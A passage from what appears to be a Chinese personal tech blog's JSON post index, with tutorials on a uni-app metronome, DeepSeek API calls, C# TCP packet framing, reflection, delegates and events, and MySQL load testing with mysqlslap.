&#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- 滑块定义节拍数 --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- 速度显示 --&gt; &lt;view class=&quot;label&quot;&gt;速度：&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- 增加/减少速度按钮 --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot; @touchstart=&quot;handleLongPressStart(&#x27;increase&#x27;)&quot; @touchend=&quot;handleLongPressEnd&quot; &gt; 加速 &lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot; @touchstart=&quot;handleLongPressStart(&#x27;decrease&#x27;)&quot; @touchend=&quot;handleLongPressEnd&quot; &gt; 减速 &lt;/button&gt; &lt;/view&gt; &lt;!-- 播放/停止按钮 --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // 初始节拍数 speed: 60, // 初始速度（每分钟节拍数） playStatus: &#x27;stopped&#x27;, // 播放状态，初始为停止 intervalId: null, // 用于存储定时器ID audioContext: null, // 音频上下文 longPressTimer: null, // 用于长按的定时器 &#125;; &#125;, methods: &#123; // 初始化音频上下文 initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); this.audioContext.volume = 1.0; &#125; &#125;, // 处理滑块改变节拍数的事件 handleBeatChange(event) &#123; this.beat = event.detail.value; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.playFirstBeatAudio(); &#125; &#125;, // 增加速度 increaseSpeed() &#123; this.speed += 5; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.playFirstBeatAudio(); &#125; &#125;, // 减少速度 decreaseSpeed() &#123; this.speed -= 5; if (this.speed &lt; 5) &#123; this.speed = 5; &#125; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.playFirstBeatAudio(); &#125; &#125;, // 长按开始 handleLongPressStart(action) &#123; this.longPressTimer = setInterval(() =&gt; &#123; if (action === &#x27;increase&#x27;) &#123; this.increaseSpeed(); &#125; else if (action === &#x27;decrease&#x27;) &#123; this.decreaseSpeed(); &#125; &#125;, 100); // 每100ms触发一次 &#125;, // 长按结束 handleLongPressEnd() &#123; clearInterval(this.longPressTimer); this.longPressTimer = null; &#125;, // 切换播放/停止状态的方法 togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // 启动节拍器的方法，通过定时器播放声音 startMetronome() &#123; const intervalTime = 60000 / this.speed; // 根据速度计算每个节拍的间隔时间（毫秒） let currentBeat = 1; this.intervalId = setInterval(() =&gt; &#123; this.playBeatAudio(currentBeat); if (currentBeat === this.beat) &#123; currentBeat = 1; &#125; else &#123; currentBeat++; &#125; &#125;, intervalTime); &#125;, // 停止节拍器的方法 stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; &#125;, // 重启节拍器（用于更新速度或节拍） restartMetronome() &#123; this.stopMetronome(); this.startMetronome(); &#125;, // 播放第一拍音频的方法 playFirstBeatAudio() &#123; if (this.beat &gt; 0) &#123; if (this.audioContext) &#123; if (this.beat === 1) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; &#125; this.audioContext.play(); &#125; &#125; &#125;, // 根据当前拍数播放音频的方法 playBeatAudio(currentBeat) &#123; if (this.beat &gt; 0 &amp;&amp; this.audioContext) &#123; if (currentBeat === 1) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; &#125; this.audioContext.play(); &#125; &#125;, &#125;, onUnload() &#123; // 页面卸载时清理音频资源 if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"}],"author":"mu"},{"title":"DeepSeek-V2.5","slug":"DeepSeek-V2-5","date":"2024-11-29T19:13:44.000Z","updated":"2024-11-29T19:18:43.503Z","comments":true,"path":"2024/11/30/DeepSeek-V2-5/","permalink":"https://banjinmei.github.io/2024/11/30/DeepSeek-V2-5/","excerpt":"","text":"DeepSeek-V2.5在目前大模型主流榜单中，DeepSeek-V2.5 均表现出色 中文综合能力（AlignBench）位列开源榜首与 GPT-4-Turbo，文心 4.0 等闭源模型在评测中处于同一梯队 英文综合能力（MT-Bench）处于第一梯队英文综合能力（MT-Bench）与最强的开源模型 LLaMA3-70B 处于同一梯队，超过最强 MoE 开源模型 Mixtral8x22B 知识、数学、推理、编程等榜单结果位居前列开源模型支持 128K 上下文 api1234567891011curl https://api.deepseek.com/chat/completions \\ -H &quot;Content-Type: application/json&quot; \\ -H &quot;Authorization: Bearer xx&quot; \\ -d &#x27;&#123; &quot;model&quot;: &quot;deepseek-chat&quot;, &quot;messages&quot;: [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125; ], &quot;stream&quot;: false &#125;&#x27; py123456789101112131415161718# Please install OpenAI SDK first: `pip3 install openai`from openai import OpenAIclient = OpenAI(api_key=&quot;skx&quot;, base_url=&quot;https://api.deepseek.com&quot;)response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;你好，你是什么大模型？你能做什么？&quot;&#125;, ], stream=False)print(response.choices[0].message.content) node123456789101112131415161718192021// Please install OpenAI SDK first: `npm install openai`import OpenAI from &quot;openai&quot;;const openai = new OpenAI(&#123; baseURL: &#x27;https://api.deepseek.com&#x27;, apiKey: &#x27;xx&#x27;&#125;);async function main() &#123; const completion = await openai.chat.completions.create(&#123; messages: [&#123; role: &quot;system&quot;, content: &quot;You are a helpful assistant.&quot; &#125;], model: &quot;deepseek-chat&quot;, &#125;); console.log(completion.choices[0].message.content);&#125;main(); 得到回答: 1234567891011你好！我是一个基于人工智能技术的大型语言模型，由深度求索（DeepSeek）公司开发。我的核心功能是通过大量文本数据训练，能够理解和生成自然语言，从而协助用户解答问题、提供信息、进行对话等。我能做的事情包括但不限于：1. **回答问题**：无论是科学知识、历史事件、文化常识还是日常生活中的疑问，我都可以尽力提供准确的信息。2. **提供建议**：在某些情况下，我可以根据你的需求提供一些建议或指导。3. **语言翻译**：虽然我的主要语言是中文，但我也可以理解和生成其他语言的文本，帮助进行简单的翻译工作。4. **文本创作**：我可以协助撰写文章、故事、报告等文本内容，提供创意和写作支持。5. **学习辅导**：在教育领域，我可以提供一些基础的学习辅导，帮助理解复杂的概念。请注意，虽然我尽力提供准确和有用的信息，但我也有局限性，尤其是在处理非常专业或最新的信息时。我的知识截止日期是2023年，因此对于之后发生的事件或发展的信息可能不准确或不完整。 Temperature 设置temperature 参数默认为 1.0。 场景 温度代码生成&#x2F;数学解题 0.0数据抽取&#x2F;分析 1.0通用对话 1.3翻译 1.3创意类写作&#x2F;诗歌创作 1.5 token 和字数的换算比1 个英文字符 ≈ 0.3 个 token。1 个中文字符 ≈ 0.6 个 token。 错误码 描述400 - 格式错误 原因：请求体格式错误解决方法：请根据错误信息提示修改请求体401 - 认证失败 原因：API key 错误，认证失败解决方法：请检查您的 API key 是否正确，如没有 API key，请先 创建 API key402 - 余额不足 原因：账号余额不足解决方法：请确认账户余额，并前往 充值 页面进行充值422 - 参数错误 原因：请求体参数错误解决方法：请根据错误信息提示修改相关参数429 - 请求速率达到上限 原因：请求速率（TPM 或 RPM）达到上限解决方法：请合理规划您的请求速率。500 - 服务器故障 原因：服务器内部故障解决方法：请等待后重试。若问题一直存在，请联系我们解决503 - 服务器繁忙 原因：服务器负载过高解决方法：请稍后重试您的请求 JSON Output在很多场景下，用户需要让模型严格按照 JSON 格式来输出，以实现输出的结构化，便于后续逻辑进行解析。 DeepSeek 提供了 JSON Output 功能，来确保模型输出合法的 JSON 字符串。 注意事项设置 response_format 参数为 {‘type’: ‘json_object’}。用户传入的 system 或 user prompt 中必须含有 json 字样，并给出希望模型输出的 JSON 格式的样例，以指导模型来输出合法 JSON。需要合理设置 max_tokens 参数，防止 JSON 字符串被中途截断。 1234567891011121314151617181920212223242526272829303132333435import jsonfrom openai import OpenAIclient = OpenAI( api_key=&quot;&lt;your api key&gt;&quot;, base_url=&quot;https://api.deepseek.com&quot;,)system_prompt = &quot;&quot;&quot;The user will provide some exam text. Please parse the &quot;question&quot; and &quot;answer&quot; and output them in JSON format. EXAMPLE INPUT: Which is the highest mountain in the world? Mount Everest.EXAMPLE JSON OUTPUT:&#123; &quot;question&quot;: &quot;Which is the highest mountain in the world?&quot;, &quot;answer&quot;: &quot;Mount Everest&quot;&#125;&quot;&quot;&quot;user_prompt = &quot;Which is the longest river in the world? The Nile River.&quot;messages = [&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: system_prompt&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: user_prompt&#125;]response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=messages, response_format=&#123; &#x27;type&#x27;: &#x27;json_object&#x27; &#125;)print(json.loads(response.choices[0].message.content)) 模型将会输出： 1234&#123; &quot;question&quot;: &quot;Which is the longest river in the world?&quot;, &quot;answer&quot;: &quot;The Nile River&quot;&#125; Function CallingFunction Calling 让模型能够调用外部工具，来增强自身能力。 获取用户当前位置的天气信息为例，展示了使用 Function Calling 的完整 Python 代码。 Function Calling 的具体 API 格式请参考对话补全文档。 123456789101112131415161718192021222324252627282930313233343536373839404142434445from openai import OpenAIdef send_messages(messages): response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=messages, tools=tools ) return response.choices[0].messageclient = OpenAI( api_key=&quot;&lt;your api key&gt;&quot;, base_url=&quot;https://api.deepseek.com&quot;,)tools = [ &#123; &quot;type&quot;: &quot;function&quot;, &quot;function&quot;: &#123; &quot;name&quot;: &quot;get_weather&quot;, &quot;description&quot;: &quot;Get weather of an location, the user shoud supply a location first&quot;, &quot;parameters&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: &#123; &quot;location&quot;: &#123; &quot;type&quot;: &quot;string&quot;, &quot;description&quot;: &quot;The city and state, e.g. San Francisco, CA&quot;, &#125; &#125;, &quot;required&quot;: [&quot;location&quot;] &#125;, &#125; &#125;,]messages = [&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;How&#x27;s the weather in Hangzhou?&quot;&#125;]message = send_messages(messages)print(f&quot;User&gt;\\t &#123;messages[0][&#x27;content&#x27;]&#125;&quot;)tool = message.tool_calls[0]messages.append(message)messages.append(&#123;&quot;role&quot;: &quot;tool&quot;, &quot;tool_call_id&quot;: tool.id, &quot;content&quot;: &quot;24℃&quot;&#125;)message = send_messages(messages)print(f&quot;Model&gt;\\t &#123;message.content&#125;&quot;) 这个例子的执行流程如下： 用户：询问现在的天气模型：返回 function get_weather({location: ‘Hangzhou’})用户：调用 function get_weather({location: ‘Hangzhou’})，并传给模型。模型：返回自然语言，”The current temperature in Hangzhou is 24°C.”注：上述代码中 get_weather 函数功能需由用户提供，模型本身不执行具体函数。 此外还有上下文，缓存等 能做什么？提示库探索 DeepSeek 提示词样例，挖掘更多可能 代码改写对代码进行修改，来实现纠错、注释、调优等。 代码解释对代码进行解释，来帮助理解代码内容。 代码生成让模型生成一段完成特定功能的代码。 内容分类对文本内容进行分析，并对齐进行自动归类 结构化输出将内容转化为 Json，来方便后续程序处理 角色扮演（自定义人设）自定义人设，来与用户进行角色扮演。 角色扮演（情景续写）提供一个场景，让模型模拟该场景下的任务对话 散文写作让模型根据提示词创作散文 诗歌创作让模型根据提示词，创作诗歌 文案大纲生成根据用户提供的主题，来生成文案大纲 宣传标语生成让模型生成贴合商品信息的宣传标语。 模型提示词生成根据用户需求，帮助生成高质量提示词 中英翻译专家中英文互译，对用户输入内容进行翻译","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"packet splicing","slug":"packet-splicing","date":"2024-11-27T14:46:43.000Z","updated":"2024-11-27T14:51:40.459Z","comments":true,"path":"2024/11/27/packet-splicing/","permalink":"https://banjinmei.github.io/2024/11/27/packet-splicing/","excerpt":"","text":"： 模拟粘包的场景粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。 使用固定分隔符或包头+包体常见的解决粘包方案是使用分隔符（如 \\n 或特殊字符），或采用固定的包头标识数据长度。 服务端代码 1234567891011121314151617181920212223242526272829303132333435363738394041using System;using System.Net;using System.Net.Sockets;using System.Text;using System.Threading;class TcpServer&#123; static void Main() &#123; TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(&quot;Server started, waiting for connection...&quot;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(&quot;Client connected!&quot;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) &gt; 0) &#123; string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($&quot;Received: &#123;receivedData&#125;&quot;); // 模拟数据未分包的场景 Console.WriteLine(&quot;Processing received data...&quot;); string[] messages = receivedData.Split(&#x27;|&#x27;); foreach (var message in messages) &#123; if (!string.IsNullOrEmpty(message)) &#123; Console.WriteLine($&quot;Processed: &#123;message&#125;&quot;); &#125; &#125; &#125; clientSocket.Close(); listener.Stop(); &#125;&#125; 客户端代码 123456789101112131415161718192021222324252627using System;using System.Net.Sockets;using System.Text;class TcpClientDemo&#123; static void Main() &#123; TcpClient client = new TcpClient(&quot;127.0.0.1&quot;, 5000); Console.WriteLine(&quot;Connected to server.&quot;); NetworkStream stream = client.GetStream(); // 模拟粘包场景：连续发送多个小数据包 string[] messages = &#123; &quot;Message1&quot;, &quot;Message2&quot;, &quot;Message3&quot; &#125;; foreach (var message in messages) &#123; string data = message + &quot;|&quot;; byte[] buffer = Encoding.UTF8.GetBytes(data); stream.Write(buffer, 0, buffer.Length); Console.WriteLine($&quot;Sent: &#123;message&#125;&quot;); &#125; stream.Close(); client.Close(); &#125;&#125; 分析代码中的粘包场景客户端模拟粘包通过连续发送数据包（Message1|Message2|Message3|），未等待服务端处理后再发送下一个包。 服务端接收数据时，数据可能一次性接收到多个数据包，也可能接收到不完整的数据包。通过使用分隔符 | 拆分数据，可以解决粘包问题。 扩展：更高效的分包方式（包头+包体）数据格式包头：4 字节，表示包体长度。包体：实际数据内容。 处理粘包问题服务端 123456789101112131415161718while (true)&#123; int headerSize = 4; byte[] headerBuffer = new byte[headerSize]; // 读取包头 int headerBytes = clientSocket.Receive(headerBuffer); if (headerBytes &lt; headerSize) break; // 连接断开 int bodyLength = BitConverter.ToInt32(headerBuffer, 0); byte[] bodyBuffer = new byte[bodyLength]; // 读取包体 int bodyBytes = clientSocket.Receive(bodyBuffer); string message = Encoding.UTF8.GetString(bodyBuffer, 0, bodyBytes); Console.WriteLine($&quot;Received Message: &#123;message&#125;&quot;);&#125; 客户端代码（包头 + 包体） 123456789101112131415161718192021222324252627282930313233343536373839using System;using System.Net.Sockets;using System.Text;class TcpClientDemo&#123; static void Main() &#123; TcpClient client = new TcpClient(&quot;127.0.0.1&quot;, 5000); Console.WriteLine(&quot;Connected to server.&quot;); NetworkStream stream = client.GetStream(); // 模拟发送多条消息 string[] messages = &#123; &quot;Hello, Server!&quot;, &quot;This is a test.&quot;, &quot;Goodbye!&quot; &#125;; foreach (var message in messages) &#123; // 将消息转为字节数组 byte[] bodyBuffer = Encoding.UTF8.GetBytes(message); // 包头：消息长度（4 字节整数） byte[] headerBuffer = BitConverter.GetBytes(bodyBuffer.Length); // 组合包头和包体 byte[] packet = new byte[headerBuffer.Length + bodyBuffer.Length]; Buffer.BlockCopy(headerBuffer, 0, packet, 0, headerBuffer.Length); Buffer.BlockCopy(bodyBuffer, 0, packet, headerBuffer.Length, bodyBuffer.Length); // 发送数据包 stream.Write(packet, 0, packet.Length); Console.WriteLine($&quot;Sent: &#123;message&#125;&quot;); &#125; stream.Close(); client.Close(); Console.WriteLine(&quot;Disconnected from server.&quot;); &#125;&#125; 包头使用 BitConverter.GetBytes(int) 将包体长度转换为 4 字节的字节数组。这样，服务端可以根据包头解析出包体的长度，确保不会漏读或多读数据。 包体实际的消息内容（字符串）被编码为字节数组 bodyBuffer。 组合包头和包体使用 Buffer.BlockCopy 将包头和包体拼接成一个完整的数据包，按照以下格式发送： [包头 (4字节)][包体 (N字节)]发送逻辑调用 stream.Write 将整个数据包发送到服务端。即使多次发送，服务端依然能够正确解析每个数据包的内容。 运行结果假设服务端按照之前的代码实现分包逻辑（先读包头，再根据长度读包体），运行客户端和服务端后，输出类似以下结果： 服务端输出 12345Server started, waiting for connection...Client connected!Received Message: Hello, Server!Received Message: This is a test.Received Message: Goodbye! 客户端输出 12345Connected to server.Sent: Hello, Server!Sent: This is a test.Sent: Goodbye!Disconnected from server. 这种方式可以避免使用分隔符（如 |）时可能产生的冲突问题，常用于传输二进制数据和更复杂的协议通信。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"csharp reflection delegate","slug":"csharp-reflection-delegate","date":"2024-11-24T09:36:50.000Z","updated":"2024-12-11T13:25:06.302Z","comments":true,"path":"2024/11/24/csharp-reflection-delegate/","permalink":"https://banjinmei.github.io/2024/11/24/csharp-reflection-delegate/","excerpt":"","text":"Reflection反射动态加载和创建对象：反射可以在运行时加载程序集，并基于类型信息创建对象实例，而无需在编译时知道具体的类型。这对于实现插件系统、动态加载模块或在不同版本的库之间提供兼容性非常有用。 反射可以获取有关类型（如类、接口、结构体等）及其成员（如字段、属性、方法等）的详细信息。这对于生成文档、进行代码分析或创建序列化&#x2F;反序列化机制等任务非常有用。 12345678910111213141516171819202122232425262728class Program &#123; static void Main(string[] args) &#123; // 加载包含类型的程序集 Assembly assembly = Assembly.LoadFrom(&quot;ReflectionExample.dll&quot;); // 获取类型信息 Type type = assembly.GetType(&quot;ReflectionExample.MyClass&quot;); // 创建对象实例 object instance = Activator.CreateInstance(type); // 获取方法信息 MethodInfo methodInfo = type.GetMethod(&quot;MyMethod&quot;); // 调用方法 methodInfo.Invoke(instance, new object[] &#123; &quot;Hello, Reflection!&quot; &#125;); &#125; &#125; public class MyClass &#123; public void MyMethod(string message) &#123; Console.WriteLine(message); &#125; &#125; Delegate委托委托是一种类型安全的函数指针，可以用来引用一个或多个具有相同签名的方法。委托（Delegate）是一种特殊的类型，它代表对具有特定参数列表和返回类型的函数的引用。委托可以用来封装静态方法或实例方法，并且可以在运行时像普通变量一样传递。这使得委托成为一种强大的工具，用于实现回调函数、事件处理以及其他需要函数作为参数传递的场景。 委托的基本特性类型安全：委托是类型安全的，因为它们在声明时会指定一个方法签名，只有与这个签名匹配的方法才能被委托引用。多播能力：大多数委托支持多播，即一个委托实例可以引用多个方法。当调用该委托时，所有引用的方法都会被依次调用。灵活性：委托可以用来引用类的实例方法或静态方法，也可以引用匿名方法（使用lambda表达式）。定义委托委托可以通过delegate关键字定义。定义时需要指定返回类型和参数列表。有访问修饰符，delegate，返回值类型，委托名称，参数-可选。可以在类内部，可以在外部。 本质底层是个特殊类(强类型)， 继承运行时的MulticastDelegate 1public delegate void MyDelegate(string message); // 返回类型为void，接受一个字符串参数 使用委托创建委托实例 可以通过委托的构造函数或者new关键字创建委托实例，并将它绑定到具体的方法上。 123456789101112131415161718192021222324252627 public class MyClass&#123; public void MyMethod(string message) &#123; Console.WriteLine(message); &#125;&#125;public class Program&#123; public static void StaticMethod(string message) &#123; Console.WriteLine(&quot;Static: &quot; + message); &#125; public static void Main() &#123; MyClass instance = new MyClass(); MyDelegate del1 = new MyDelegate(instance.MyMethod); MyDelegate del2 = new MyDelegate(StaticMethod); // 调用委托 del1(&quot;Hello from instance method&quot;); del2(&quot;Hello from static method&quot;); &#125;&#125; 多播委托如果 定义的委托不是void返回类型，那么当委托指向多个方法时，只有最后一个方法的返回值会被返回。对于返回类型为void的委托，所有方法都会被执行。 12345678910111213141516171819202122 public class Program&#123; public static void Method1(string message) &#123; Console.WriteLine(&quot;Method1: &quot; + message); &#125; public static void Method2(string message) &#123; Console.WriteLine(&quot;Method2: &quot; + message); &#125; public static void Main() &#123; MyDelegate del1 = new MyDelegate(Method1); MyDelegate del2 = new MyDelegate(Method2); MyDelegate combined = del1 + del2; // 组合两个委托 combined(&quot;Hello multi-cast delegate&quot;); // 调用组合后的委托 &#125;&#125; 使用Lambda表达式从C# 3.0开始， 可以使用lambda表达式来创建委托，这使得代码更加简洁。 123456789 public class Program&#123; public static void Main() &#123; MyDelegate del = message =&gt; Console.WriteLine(&quot;Lambda: &quot; + message); del(&quot;Hello lambda expression&quot;); &#125;&#125; 参数传递委托12345678910111213141516171819202122232425262728293031323334353637383940414243namespace ConsoleApp1T1&#123; public delegate void NoReOutClass(); public class MyDele &#123; public delegate void NoReP(); public delegate void NoRePn(int x, int y); public delegate int WithReP(); public delegate int WithRePn(int x,ref int y); public void show() &#123; //NoReP mh1 = new NoReP(DoNothing); NoReP methodhander1 = DoNothing;//语法糖 //methodhander1.Invoke();//执行委托 //old dotnet ver BeginInvoke //本质是类的实例 可以做为参数传递 ExDele(methodhander1);//类似容器 把一段函数-业务逻辑 传递到不同的地方 ////使用 // MyDele myDele = new MyDele(); // myDele.show(); &#125; public void ExDele(NoReP de) &#123; de.Invoke(); &#125; public void DoNothing() &#123; Console.WriteLine(&quot;do nothing&quot;); &#125; public void DoObj() &#123; Console.WriteLine(&quot;do obj&quot;); &#125; &#125;&#125; 事件事件是基于订阅-发布模式的一种机制，用于实现对象之间的解耦。 1234567891011121314151617181920212223242526272829303132333435public class Publisher&#123; public event EventHandler CustomEvent; protected virtual void OnCustomEvent(EventArgs e) &#123; CustomEvent?.Invoke(this, e); &#125; public void TriggerEvent() &#123; OnCustomEvent(EventArgs.Empty); &#125;&#125;public class Subscriber&#123; public void OnCustomEvent(object sender, EventArgs e) &#123; Console.WriteLine(&quot;Event received.&quot;); &#125;&#125;public class Program&#123; public static void Main() &#123; Publisher publisher = new Publisher(); Subscriber subscriber = new Subscriber(); publisher.CustomEvent += subscriber.OnCustomEvent; publisher.TriggerEvent(); &#125;&#125; 在 .NET 中，事件是一种特殊的委托类型（委托的一个变量），用于实现发布-订阅模式。事件允许一个对象（发布者）通知其他对象（订阅者）发生了某些事情。下面是一个简单的 .NET 事件的例子，我们将创建一个简单的计数器类 Counter，当计数达到特定值时触发事件。 定义事件首先，我们需要定义一个事件处理器委托，然后在 Counter 类中声明一个事件。 123456789101112131415161718192021222324252627282930313233 using System;// 定义一个事件处理程序委托public delegate void ReachedEventHandler(object source, EventArgs e);// 计数器类public class Counter&#123; // 定义一个事件 public event ReachedEventHandler Reached; private int _count; // 增加计数的方法 public void Increment() &#123; _count++; Console.WriteLine($&quot;Count is now &#123;_count&#125;&quot;); // 当计数达到某个值时触发事件 if (_count &gt;= 5) &#123; OnReached(); &#125; &#125; // 触发事件的方法 protected virtual void OnReached() &#123; Reached?.Invoke(this, EventArgs.Empty); &#125;&#125; 使用事件接下来，我们将在主程序中创建 Counter 类的实例，并订阅其 Reached 事件。 1234567891011121314151617181920212223 class Program&#123; static void Main(string[] args) &#123; var counter = new Counter(); // 订阅事件 counter.Reached += Counter_Reached; // 模拟增加计数 for (int i = 0; i &lt; 6; i++) &#123; counter.Increment(); &#125; &#125; // 事件处理方法 private static void Counter_Reached(object source, EventArgs e) &#123; Console.WriteLine(&quot;The count has reached the limit!&quot;); &#125;&#125; 在这个例子中，每当计数器的值达到5时，就会触发 Reached 事件。订阅了此事件的对象将接收到通知，并可以执行相应的操作。在这个例子中，我们的主程序订阅了这个事件，并定义了一个事件处理方法 Counter_Reached，该方法会在事件被触发时输出一条消息。 这是一个非常基础的示例，实际应用中事件可以携带更多的信息，例如通过自定义的事件参数类来传递数据给事件处理方法。 泛型泛型允许 在定义方法、类或接口时不指定具体的类型，而是在使用的时候再指定。这样可以提高代码的复用性和类型安全性。 123456789101112131415161718192021public class Box&lt;T&gt;&#123; private T item; public Box(T item) &#123; this.item = item; &#125; public T GetItem() &#123; return item; &#125;&#125;// 使用示例Box&lt;string&gt; stringBox = new Box&lt;string&gt;(&quot;Hello World&quot;);string content = stringBox.GetItem();Console.WriteLine(content);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"mysql 压测","slug":"sql-压测","date":"2024-11-22T14:55:35.000Z","updated":"2024-11-29T19:08:14.327Z","comments":true,"path":"2024/11/22/sql-压测/","permalink":"https://banjinmei.github.io/2024/11/22/sql-%E5%8E%8B%E6%B5%8B/","excerpt":"","text":"mysqlslap是 MySQL 自带的一个用于模拟负载和测试数据库性能的命令行工具。它可以帮助开发者或数据库管理员了解在不同操作模式下数据库的表现情况，从而优化数据库配置或查询语句。使用方法 基本语法1mysqlslap [options] 常用选项–auto-generate-sql: 自动生成 SQL 测试数据，默认为开启状态。–concurrency&#x3D;thread_count: 指定并发线程数，例如 –concurrency&#x3D;50 表示创建 50 个并发连接。–iterations&#x3D;count: 指定测试迭代次数，即执行多少轮测试。–create-schema&#x3D;schema_name: 创建并使用指定的 schema 进行测试。–query&#x3D;query_file: 使用文件中的 SQL 语句进行测试。–auto-generate-sql-add-auto-increment: 对自动生成的表添加自动增长字段。–auto-generate-sql-load-type&#x3D;type: 指定测试的数据加载类型，可以是 insert, update, delete, select 或 mixed。–number-of-queries&#x3D;value: 当使用 –auto-generate-sql 参数时，设置每个线程执行的查询数量。–engine&#x3D;engine_name: 指定存储引擎，如 InnoDB、MyISAM 等。示例 基本压力测试：1mysqlslap --concurrency=10 --iterations=3 --auto-generate-sql --engine=InnoDB 这条命令将启动一个使用 InnoDB 存储引擎的压力测试，使用 10 个并发连接，执行 3 轮测试，并自动生成 SQL 语句。自定义查询的压力测试：如果你有一个包含多个 SQL 语句的文件 test_queries.sql，可以这样使用： 1mysqlslap --concurrency=5 --iterations=2 --query=test_queries.sql 此命令将使用 5 个并发连接，执行 2 轮测试，使用 test_queries.sql 文件中定义的 SQL 语句。 混合操作的压力测试：若要测试插入、更新、删除和选择操作的混合负载，可以这样做： 1mysqlslap --concurrency=20 --iterations=1 --auto-generate-sql --auto-generate-sql-load-type=mixed --number-of-queries=1000 这将启动一个混合操作的测试，使用 20 个并发连接，执行一次迭代，总共执行 1000 条随机生成的 SQL 语句。 注意事项在进行压力测试前，请确保备份重要数据，避免测试过程中对生产环境造成影响。测试结果会受到服务器硬件性能、MySQL 配置参数等多种因素的影响，因此测试环境应尽量接近生产环境。分析测试结果时，注意查看错误信息，以便及时发现潜在的问题。 插入数据执行如下命令实现数据插入，为提高效率这里开启 10 个客户端线程同时插入，总共执行 1 百万次操作： mysqlslap -uroot -p 123123.zxcvb –concurrency&#x3D;10 –number-of-queries&#x3D;1000000 –create-schema&#x3D;IMDB–query&#x3D;”INSERT INTO people(name,age) VALUES (uuid(), RAND() * 100)” 对user表进行 100000 插入测试123456789101112131415import randomimport stringdef generate_username(): return &#x27;&#x27;.join(random.choice(string.ascii_lowercase) for _ in range(8))def generate_email(): return f&quot;&#123;generate_username()&#125;@example.com&quot;with open(&#x27;insert_data.sql&#x27;, &#x27;w&#x27;) as f: for i in range(100000): username = generate_username() email = generate_email() f.write(f&quot;INSERT INTO User (username, email) VALUES (&#x27;&#123;username&#125;&#x27;, &#x27;&#123;email&#125;&#x27;);\\n&quot;) python 生成insert_data sql 1mysqlslap --concurrency=50 --iterations=1 